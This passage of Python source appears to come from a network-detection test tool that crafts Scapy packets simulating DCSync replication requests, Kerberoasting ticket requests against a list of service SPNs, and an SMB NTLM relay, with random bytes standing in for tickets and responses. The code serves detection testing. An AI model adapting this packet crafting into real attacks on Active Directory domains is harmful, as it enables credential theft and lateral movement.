        rpc_bind_ack += b'\x10\x00\x00\x00'   # data representation
        rpc_bind_ack += struct.pack('<H', 68)  # frag length
        rpc_bind_ack += struct.pack('<H', 0)   # auth length
        rpc_bind_ack += struct.pack('<I', i)   # call ID
        rpc_bind_ack += struct.pack('<H', 5840)  # max xmit
        rpc_bind_ack += struct.pack('<H', 5840)  # max recv
        rpc_bind_ack += struct.pack('<I', 0x12345)  # assoc group
        rpc_bind_ack += struct.pack('<H', 4)   # secondary addr len
        rpc_bind_ack += b'135\x00'             # secondary addr
        rpc_bind_ack += b'\x00\x00'            # padding
        rpc_bind_ack += struct.pack('<I', 1)   # num results
        rpc_bind_ack += struct.pack('<H', 0)   # acceptance
        rpc_bind_ack += struct.pack('<H', 0)   # reason
        # Transfer syntax
        rpc_bind_ack += (
            b'\x04\x5d\x88\x8a\xeb\x1c\xc9\x11'
            b'\x9f\xe8\x08\x00\x2b\x10\x48\x60'
        )
        rpc_bind_ack += struct.pack('<H', 2) + struct.pack('<H', 0)

        packets.append(
            base / IP(src=dst_ip, dst=src_ip) /
            TCP(sport=135, dport=sport, flags='PA',
                seq=server_seq, ack=client_seq) /
            Raw(load=bytes(rpc_bind_ack))
        )
        server_seq += len(rpc_bind_ack)

        # FIN the EPM connection
        fin_pkts = _tcp_fin(base, src_ip, dst_ip, sport, 135,
                            client_seq, server_seq)
        packets.extend(fin_pkts)

        # ── Phase 2: DRSUAPI on high port (simulate assigned port) ──
        drsr_port = random.randint(49152, 49200)
        sport2 = random.randint(49152, 65535)

        hs2_pkts, cseq2, sseq2 = _tcp_handshake(
            base, src_ip, dst_ip, sport2, drsr_port
        )
        packets.extend(hs2_pkts)

        # RPC Bind to DRSUAPI on the assigned port
        packets.append(
            base / IP(src=src_ip, dst=dst_ip) /
            TCP(sport=sport2, dport=drsr_port, flags='PA',
                seq=cseq2, ack=sseq2) /
            Raw(load=bytes(rpc_bind))  # Same bind payload
        )
        cseq2 += len(rpc_bind)

        # Server bind ACK
        packets.append(
            base / IP(src=dst_ip, dst=src_ip) /
            TCP(sport=drsr_port, dport=sport2, flags='PA',
                seq=sseq2, ack=cseq2) /
            Raw(load=bytes(rpc_bind_ack))
        )
        sseq2 += len(rpc_bind_ack)

        # DsGetNCChanges request (RPC Request, opnum 3)
        nc = naming_contexts[i % len(naming_contexts)]
        nc_bytes = nc.encode('utf-16-le')

        rpc_request = bytearray()
        rpc_request += b'\x05\x00\x00\x03'  # version, request, flags
        rpc_request += b'\x10\x00\x00\x00'  # data representation
        stub_data = nc_bytes + b'\x00\x00' + os.urandom(64)  # Simplified stub
        total_len = 24 + len(stub_data)
        rpc_request += struct.pack('<H', total_len)  # frag length
        rpc_request += struct.pack('<H', 0)   # auth length
        rpc_request += struct.pack('<I', i + 100)  # call ID
        rpc_request += struct.pack('<I', len(stub_data))  # alloc hint
        rpc_request += struct.pack('<H', 0)   # context ID
        rpc_request += struct.pack('<H', 3)   # opnum 3 = DsGetNCChanges
        rpc_request += stub_data

        packets.append(
            base / IP(src=src_ip, dst=dst_ip) /
            TCP(sport=sport2, dport=drsr_port, flags='PA',
                seq=cseq2, ack=sseq2) /
            Raw(load=bytes(rpc_request))
        )
        cseq2 += len(rpc_request)

        # Server large response (replication data)
        rpc_response = bytearray()
        rpc_response += b'\x05\x00\x02\x03'  # version, response, flags
        rpc_response += b'\x10\x00\x00\x00'  # data representation
        resp_stub = os.urandom(random.randint(500, 2000))  # Large replication response
        resp_total = 24 + len(resp_stub)
        rpc_response += struct.pack('<H', resp_total)
        rpc_response += struct.pack('<H', 0)
        rpc_response += struct.pack('<I', i + 100)
        rpc_response += struct.pack('<I', len(resp_stub))
        rpc_response += struct.pack('<H', 0)   # context ID
        rpc_response += struct.pack('<H', 0)   # cancel count + reserved
        rpc_response += resp_stub

        packets.append(
            base / IP(src=dst_ip, dst=src_ip) /
            TCP(sport=drsr_port, dport=sport2, flags='PA',
                seq=sseq2, ack=cseq2) /
            Raw(load=bytes(rpc_response))
        )
        sseq2 += len(rpc_response)

        # Client ACK
        packets.append(
            base / IP(src=src_ip, dst=dst_ip) /
            TCP(sport=sport2, dport=drsr_port, flags='A',
                seq=cseq2, ack=sseq2)
        )

        # FIN
        fin_pkts2 = _tcp_fin(base, src_ip, dst_ip, sport2, drsr_port,
                              cseq2, sseq2)
        packets.extend(fin_pkts2)

        log_message(f"    DsGetNCChanges #{i+1}: {nc}")

    _send_with_tracking(packets, params, delay_override=0.3)


# ── Kerberoasting ───────────────────────────────────────────────────────────

def _sim_kerberoast(params):
    """
    Kerberoasting (T1558.003): burst of TGS-REQ packets requesting
    service tickets for multiple SPNs. NDR tools detect a single source
    requesting an unusual volume of TGS tickets in a short window.
    Sent as full TCP sessions to port 88 (Kerberos KDC).
    """
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']  # KDC / Domain controller
    base = _base_packet(params)
    count = params.get('count', 20)

    log_message(f"    Attacker: {src_ip}")
    log_message(f"    KDC: {dst_ip}")

    # Target SPNs (common service accounts to kerberoast)
    target_spns = [
        'MSSQLSvc/sql01.corp.local:1433',
        'MSSQLSvc/sql02.corp.local:1433',
        'HTTP/webserver.corp.local',
        'HTTP/sharepoint.corp.local',
        'CIFS/fileserver.corp.local',
        'exchangeMDB/exchange01.corp.local',
        'IMAP/mail.corp.local',
        'SIP/lync.corp.local',
        'FTP/ftp01.corp.local',
        'WSMAN/mgmt01.corp.local',
        'TERMSRV/rdp01.corp.local',
        'MSSQLSvc/analytics.corp.local:1433',
        'HTTP/jenkins.corp.local',
        'HTTP/gitlab.corp.local',
        'LDAP/dc02.corp.local',
        'DNS/dc01.corp.local',
        'kafka/broker01.corp.local',
        'HTTP/grafana.corp.local',
        'MongoDB/mongo01.corp.local',
        'HTTP/jira.corp.local',
    ]

    packets = []
    for i in range(min(count, len(target_spns))):
        spn = target_spns[i]
        sport = random.randint(49152, 65535)

        # TCP handshake to KDC port 88
        hs_pkts, client_seq, server_seq = _tcp_handshake(
            base, src_ip, dst_ip, sport, 88
        )
        packets.extend(hs_pkts)

        # Build a TGS-REQ (Kerberos v5)
        # ASN.1 structure: APPLICATION 12 (TGS-REQ)
        realm = b'CORP.LOCAL'
        sname_parts = spn.split('/')
        service_class = sname_parts[0].encode()
        service_host = sname_parts[1].encode() if len(sname_parts) > 1 else b'unknown'

        # Simplified but structurally valid TGS-REQ
        # This builds enough of the Kerberos structure for NDR to parse
        tgs_req = bytearray()

        # Inner body of TGS-REQ
        body = bytearray()

        # KDC-Options [0]: forwardable, renewable, canonicalize
        body += b'\xa0\x07\x03\x05\x00\x40\x81\x00\x10'

        # Realm [2]
        realm_der = _asn1_string(realm)
        body += b'\xa2' + _asn1_len(len(realm_der)) + realm_der

        # SName [3]: sequence of principal name
        sname_seq = bytearray()
        # name-type [0]: SRV_INST (2)
        sname_seq += b'\xa0\x03\x02\x01\x02'
        # name-string [1]: sequence of strings
        name_strs = _asn1_string(service_class) + _asn1_string(service_host)
        name_seq = b'\x30' + _asn1_len(len(name_strs)) + name_strs
        sname_seq += b'\xa1' + _asn1_len(len(name_seq)) + name_seq
        sname_outer = b'\x30' + _asn1_len(len(sname_seq)) + sname_seq
        body += b'\xa3' + _asn1_len(len(sname_outer)) + sname_outer

        # Nonce [7]
        nonce_val = random.randint(100000000, 999999999)
        nonce_der = b'\x02\x04' + struct.pack('!I', nonce_val)
        body += b'\xa7' + _asn1_len(len(nonce_der)) + nonce_der

        # etype [8]: RC4-HMAC (23) - what kerberoasting targets
        etype_der = b'\x30\x05\x02\x01\x17\x02\x00'
        body += b'\xa8' + _asn1_len(len(etype_der)) + etype_der

        # Wrap in KDC-REQ-BODY SEQUENCE
        req_body = b'\x30' + _asn1_len(len(body)) + body

        # Build TGS-REQ outer structure
        tgs_inner = bytearray()
        # pvno [1]: 5
        tgs_inner += b'\xa1\x03\x02\x01\x05'
        # msg-type [2]: TGS-REQ (12)
        tgs_inner += b'\xa2\x03\x02\x01\x0c'

        # padata [3]: PA-TGS-REQ with fake TGT (authenticator)
        fake_tgt = os.urandom(random.randint(200, 400))
        pa_tgs = b'\x30' + _asn1_len(len(fake_tgt) + 8)
        pa_tgs += b'\xa1\x03\x02\x01\x01'  # padata-type: PA-TGS-REQ (1)
        pa_tgs += b'\xa2' + _asn1_len(len(fake_tgt)) + fake_tgt
        pa_seq = b'\x30' + _asn1_len(len(pa_tgs)) + pa_tgs
        tgs_inner += b'\xa3' + _asn1_len(len(pa_seq)) + pa_seq

        # req-body [4]
        tgs_inner += b'\xa4' + _asn1_len(len(req_body)) + req_body

        # Wrap in SEQUENCE
        tgs_seq = b'\x30' + _asn1_len(len(tgs_inner)) + tgs_inner

        # APPLICATION 12 tag
        tgs_req = b'\x6c' + _asn1_len(len(tgs_seq)) + tgs_seq

        # Kerberos uses a 4-byte length prefix over TCP
        krb_tcp = struct.pack('!I', len(tgs_req)) + tgs_req

        packets.append(
            base / IP(src=src_ip, dst=dst_ip) /
            TCP(sport=sport, dport=88, flags='PA',
                seq=client_seq, ack=server_seq) /
            Raw(load=bytes(krb_tcp))
        )
        client_seq += len(krb_tcp)

        # KDC response (TGS-REP with encrypted service ticket)
        # The large encrypted ticket is what gets cracked offline
        fake_ticket = os.urandom(random.randint(800, 1500))
        tgs_rep_inner = bytearray()
        tgs_rep_inner += b'\xa0\x03\x02\x01\x05'  # pvno
        tgs_rep_inner += b'\xa1\x03\x02\x01\x0d'  # msg-type: TGS-REP (13)
        tgs_rep_inner += b'\xa5' + _asn1_len(len(fake_ticket)) + fake_ticket
        tgs_rep_seq = b'\x30' + _asn1_len(len(tgs_rep_inner)) + tgs_rep_inner
        tgs_rep = b'\x6d' + _asn1_len(len(tgs_rep_seq)) + tgs_rep_seq
        krb_tcp_resp = struct.pack('!I', len(tgs_rep)) + tgs_rep

        packets.append(
            base / IP(src=dst_ip, dst=src_ip) /
            TCP(sport=88, dport=sport, flags='PA',
                seq=server_seq, ack=client_seq) /
            Raw(load=bytes(krb_tcp_resp))
        )
        server_seq += len(krb_tcp_resp)

        # Client ACK
        packets.append(
            base / IP(src=src_ip, dst=dst_ip) /
            TCP(sport=sport, dport=88, flags='A',
                seq=client_seq, ack=server_seq)
        )

        # FIN
        fin_pkts = _tcp_fin(base, src_ip, dst_ip, sport, 88,
                            client_seq, server_seq)
        packets.extend(fin_pkts)

        log_message(f"    TGS-REQ #{i+1}: {spn}")

    _send_with_tracking(packets, params, delay_override=0.1)


def _asn1_len(length):
    """Encode an ASN.1 length field."""
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return bytes([0x81, length])
    else:
        return bytes([0x82]) + struct.pack('!H', length)


def _asn1_string(data):
    """Encode an ASN.1 GeneralString."""
    if isinstance(data, str):
        data = data.encode()
    return b'\x1b' + _asn1_len(len(data)) + data


# ── NTLM Relay ──────────────────────────────────────────────────────────────

def _sim_ntlm_relay(params):
    """
    NTLM relay attack (T1557.001): simulates the traffic pattern of
    intercepting NTLM authentication from one host and relaying it to
    another (e.g., SMB->SMB relay). NDR tools detect the relay pattern:
    inbound NTLM auth immediately followed by outbound NTLM auth
    from the same host with matching challenge/response tokens.
    """
    src_ip = params['src_ip']     # Attacker/relay host
    dst_ip = params['dst_ip']     # Target being relayed to
    base = _base_packet(params)
    count = params.get('count', 10)

    # Simulated victim IPs (hosts whose auth is being relayed)
    octets = src_ip.split('.')
    subnet = '.'.join(octets[:3])
    victims = [f"{subnet}.{random.randint(10, 250)}" for _ in range(min(count, 10))]

    log_message(f"    Relay host: {src_ip}")
    log_message(f"    Relay target: {dst_ip}")
    log_message(f"    Victim sources: {len(victims)} hosts")

    # NTLM message type constants
    NTLMSSP_NEGOTIATE = (
        b'NTLMSSP\x00'
        b'\x01\x00\x00\x00'   # Type 1 (Negotiate)
        b'\x97\x82\x08\xe2'   # Flags: NTLM, Unicode, Seal, Sign
        b'\x00\x00\x00\x00'   # Domain name fields (empty)
        b'\x00\x00\x00\x00'
        b'\x00\x00\x00\x00'   # Workstation fields (empty)
        b'\x00\x00\x00\x00'
        b'\x0a\x00\x61\x4a'   # Version 10.0
        b'\x00\x00\x00\x0f'   # Revision
    )

    packets = []
    for i, victim_ip in enumerate(victims):
        sport_victim = random.randint(49152, 65535)
        sport_relay = random.randint(49152, 65535)

        # ═══ Phase 1: Victim -> Attacker (inbound SMB with NTLM) ═══

        # TCP handshake: victim -> attacker port 445
        hs1, cseq1, sseq1 = _tcp_handshake(
            base, victim_ip, src_ip, sport_victim, 445
        )
        packets.extend(hs1)

        # SMB2 Negotiate from victim
        smb_neg = bytearray()
        smb_neg += b'\x00\x00\x00\x44'     # NetBIOS length
        smb_neg += b'\xfeSMB'               # SMB2 magic
        smb_neg += struct.pack('<H', 64)    # header length
        smb_neg += b'\x00' * 2              # credit charge
        smb_neg += b'\x00' * 4              # status
        smb_neg += struct.pack('<H', 0)     # negotiate
        smb_neg += struct.pack('<H', 1)     # credits
        smb_neg += b'\x00' * 4              # flags
        smb_neg += b'\x00' * 4              # next command
        smb_neg += struct.pack('<Q', 1)     # message ID
        smb_neg += b'\x00' * 4              # reserved
        smb_neg += b'\x00' * 4              # tree ID
        smb_neg += struct.pack('<Q', 0)     # session ID
        smb_neg += b'\x00' * 16             # signature

        packets.append(
            base / IP(src=victim_ip, dst=src_ip) /
            TCP(sport=sport_victim, dport=445, flags='PA',
                seq=cseq1, ack=sseq1) /
            Raw(load=bytes(smb_neg))
        )
        cseq1 += len(smb_neg)

        # Attacker ACK
        packets.append(
            base / IP(src=src_ip, dst=victim_ip) /
            TCP(sport=445, dport=sport_victim, flags='A',
                seq=sseq1, ack=cseq1)
        )

        # SMB2 Session Setup with NTLM Type 1 (Negotiate) from victim
        ntlm_negotiate = bytearray()
        ntlm_negotiate += b'\x00\x00'  # NetBIOS length placeholder
        ntlm_negotiate += b'\xfeSMB'
        ntlm_negotiate += struct.pack('<H', 64)
        ntlm_negotiate += b'\x00' * 2
        ntlm_negotiate += b'\x00' * 4      # status
        ntlm_negotiate += struct.pack('<H', 1)  # session setup
        ntlm_negotiate += struct.pack('<H', 1)
        ntlm_negotiate += b'\x00' * 4
        ntlm_negotiate += b'\x00' * 4
        ntlm_negotiate += struct.pack('<Q', 2)  # message ID
        ntlm_negotiate += b'\x00' * 4
        ntlm_negotiate += b'\x00' * 4
        ntlm_negotiate += struct.pack('<Q', 0)  # session ID
        ntlm_negotiate += b'\x00' * 16
        # Session setup body
        ntlm_negotiate += struct.pack('<H', 25)  # struct size
        ntlm_negotiate += b'\x00'                # flags
        ntlm_negotiate += b'\x01'                # security mode
        ntlm_negotiate += struct.pack('<I', 0)   # capabilities
        ntlm_negotiate += struct.pack('<I', 0)   # channel
        sec_offset = len(ntlm_negotiate) + 4
        ntlm_negotiate += struct.pack('<H', sec_offset)  # security buffer offset
        ntlm_negotiate += struct.pack('<H', len(NTLMSSP_NEGOTIATE))
        ntlm_negotiate += struct.pack('<Q', 0)   # previous session
        ntlm_negotiate += NTLMSSP_NEGOTIATE
        # Fix NetBIOS length
        nb_len = len(ntlm_negotiate) - 4
        struct.pack_into('!I', ntlm_negotiate, 0, nb_len)

        packets.append(
            base / IP(src=victim_ip, dst=src_ip) /
            TCP(sport=sport_victim, dport=445, flags='PA',
                seq=cseq1, ack=sseq1) /
            Raw(load=bytes(ntlm_negotiate))
        )
        cseq1 += len(ntlm_negotiate)

        # ═══ Phase 2: Attacker -> Target (outbound relay with same NTLM) ═══

        # TCP handshake: attacker -> target port 445
        hs2, cseq2, sseq2 = _tcp_handshake(
            base, src_ip, dst_ip, sport_relay, 445
        )
        packets.extend(hs2)

        # Attacker relays the NTLM Negotiate to the real target
        relay_negotiate = bytearray(ntlm_negotiate)
        # Change message ID to look like a new session
        struct.pack_into('<Q', relay_negotiate, 28, 1)

        packets.append(
            base / IP(src=src_ip, dst=dst_ip) /
            TCP(sport=sport_relay, dport=445, flags='PA',
                seq=cseq2, ack=sseq2) /
            Raw(load=bytes(relay_negotiate))
        )
        cseq2 += len(relay_negotiate)

        # Target responds with NTLM Challenge (Type 2)
        challenge = os.urandom(8)
        ntlm_challenge = (
            b'NTLMSSP\x00'
            b'\x02\x00\x00\x00'       # Type 2 (Challenge)
            b'\x0c\x00\x0c\x00\x38\x00\x00\x00'  # Target name fields
            b'\x33\x82\x8a\xe2'        # Flags
        ) + challenge + b'\x00' * 8 + b'C\x00O\x00R\x00P\x00\x00\x00'

        smb_challenge = bytearray()
        smb_challenge += b'\x00\x00\x00\x00'  # NetBIOS placeholder
        smb_challenge += b'\xfeSMB'
        smb_challenge += struct.pack('<H', 64)
        smb_challenge += b'\x00' * 2
        smb_challenge += struct.pack('<I', 0xC0000016)  # STATUS_MORE_PROCESSING_REQUIRED
        smb_challenge += struct.pack('<H', 1)   # session setup
        smb_challenge += struct.pack('<H', 1)
        smb_challenge += b'\x00' * 4
        smb_challenge += b'\x00' * 4
        smb_challenge += struct.pack('<Q', 1)
        smb_challenge += b'\x00' * 4
        smb_challenge += b'\x00' * 4
        smb_challenge += struct.pack('<Q', random.randint(1, 0xFFFFFFFF))
        smb_challenge += b'\x00' * 16
        # Session setup response body
        smb_challenge += struct.pack('<H', 9)
        smb_challenge += struct.pack('<H', 0)
        sec_offset2 = len(smb_challenge)
        smb_challenge += struct.pack('<H', sec_offset2)
        smb_challenge += struct.pack('<H', len(ntlm_challenge))
        smb_challenge += ntlm_challenge
        nb_len2 = len(smb_challenge) - 4
        struct.pack_into('!I', smb_challenge, 0, nb_len2)

        packets.append(
            base / IP(src=dst_ip, dst=src_ip) /
            TCP(sport=445, dport=sport_relay, flags='PA',
                seq=sseq2, ack=cseq2) /
            Raw(load=bytes(smb_challenge))
        )
        sseq2 += len(smb_challenge)

        # ═══ Phase 3: Attacker relays challenge back to victim ═══
        # and gets NTLM Authenticate (Type 3)

        # Relay challenge to victim
        packets.append(
            base / IP(src=src_ip, dst=victim_ip) /
            TCP(sport=445, dport=sport_victim, flags='PA',
                seq=sseq1, ack=cseq1) /
            Raw(load=bytes(smb_challenge))
        )
        sseq1 += len(smb_challenge)

        # Victim sends NTLM Authenticate (Type 3) with response to challenge
        ntlm_auth = (
            b'NTLMSSP\x00'
            b'\x03\x00\x00\x00'       # Type 3 (Authenticate)
        ) + os.urandom(random.randint(200, 400))  # NTLM response blob

        smb_auth = bytearray()
        smb_auth += b'\x00\x00\x00\x00'
        smb_auth += b'\xfeSMB'
        smb_auth += struct.pack('<H', 64)
        smb_auth += b'\x00' * 2
        smb_auth += b'\x00' * 4
        smb_auth += struct.pack('<H', 1)
        smb_auth += struct.pack('<H', 1)
        smb_auth += b'\x00' * 4
        smb_auth += b'\x00' * 4
        smb_auth += struct.pack('<Q', 3)
        smb_auth += b'\x00' * 4
        smb_auth += b'\x00' * 4
        smb_auth += struct.pack('<Q', 0)
        smb_auth += b'\x00' * 16
        smb_auth += struct.pack('<H', 25)
        smb_auth += b'\x00\x01'
        smb_auth += struct.pack('<I', 0)
        smb_auth += struct.pack('<I', 0)
        sec_offset3 = len(smb_auth) + 4
        smb_auth += struct.pack('<H', sec_offset3)
        smb_auth += struct.pack('<H', len(ntlm_auth))
        smb_auth += struct.pack('<Q', 0)
        smb_auth += ntlm_auth
        nb_len3 = len(smb_auth) - 4
        struct.pack_into('!I', smb_auth, 0, nb_len3)

        packets.append(
            base / IP(src=victim_ip, dst=src_ip) /
            TCP(sport=sport_victim, dport=445, flags='PA',
                seq=cseq1, ack=sseq1) /
            Raw(load=bytes(smb_auth))
        )
        cseq1 += len(smb_auth)

        # ═══ Phase 4: Attacker relays Type 3 to target ═══
        packets.append(
            base / IP(src=src_ip, dst=dst_ip) /
            TCP(sport=sport_relay, dport=445, flags='PA',
                seq=cseq2, ack=sseq2) /
            Raw(load=bytes(smb_auth))
        )
        cseq2 += len(smb_auth)

        # Target ACKs (authentication relayed successfully)
        packets.append(
            base / IP(src=dst_ip, dst=src_ip) /
            TCP(sport=445, dport=sport_relay, flags='A',
                seq=sseq2, ack=cseq2)
        )

        # Teardown both connections
        fin1 = _tcp_fin(base, victim_ip, src_ip, sport_victim, 445, cseq1, sseq1)
        fin2 = _tcp_fin(base, src_ip, dst_ip, sport_relay, 445, cseq2, sseq2)
        packets.extend(fin1)
        packets.extend(fin2)

        log_message(f"    Relay #{i+1}: {victim_ip} -> {src_ip} -> {dst_ip}")

    _send_with_tracking(packets, params, delay_override=0.2)
